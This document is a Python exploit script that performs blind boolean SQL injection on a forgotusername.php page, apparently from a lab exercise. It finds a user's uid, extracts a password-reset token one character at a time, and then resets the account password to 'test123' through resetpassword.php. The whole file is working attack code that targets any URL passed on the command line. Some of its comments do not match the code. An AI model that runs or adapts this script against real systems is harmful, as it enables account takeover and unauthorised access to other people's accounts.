# SQL Injection occurs at forgotusername.php

# First simple brute force to gain initial access

import urllib3
import urllib
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def bruteForce(url):

    usernameUrl = url + "/forgotusername.php"
    token_extracted = ""
    uid = 0

    while True:
        uid_payload = "admin' and (select uid from users where username='user1')='%s" % uid

        params = { 
            "username": uid_payload
        }   

        rUid = requests.post(usernameUrl, verify=False, proxies=proxies, data=params, allow_redirects=False)

        if "User exists!" in rUid.text:
            print("UID Found:", uid)
            break
        
        uid += 1

    print("Finding token: ")
    # Loop through each position in the password (assuming it's up to 20 characters long)
    for i in range(1, 33):

        # Loop through ASCII values of printable characters (32 to 126) - https://theasciicode.com.ar/
        for j in range(32, 127):

            # Construct SQL injection payload
            # For some reason you have to compare the character in ascii decimal value
            sqli_payload = "admin' and (select ascii(substr(token,%s,1)) from tokens where uid=%s limit 1)='%s" % (i, uid, j)
            
            params = { 
            "username": sqli_payload
        }   
        
            r = requests.post(usernameUrl, verify=False, proxies=proxies, data=params, allow_redirects=False)

            # Check if time response was below 3 seconds
            if "User exists!" not in r.text:
                sys.stdout.write('\r' + token_extracted + chr(j))
                sys.stdout.flush()
            else:
                # If the correct character is found, append it to the extracted password
                token_extracted += chr(j)
                sys.stdout.write('\r' + token_extracted)
                sys.stdout.flush()
                break  # Move on to the next character in the password

    resetUrl = url + "/resetpassword.php"

    resetParams = {
        "token": token_extracted,
        "password1": "test123",
        "password2": "test123"
    }

    resetRequest = requests.post(resetUrl, verify=False, proxies=proxies, data=resetParams, allow_redirects=False)

    print("\nPassword reseted to test123!")

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    bruteForce(url)

if __name__ == "__main__":
    main() 
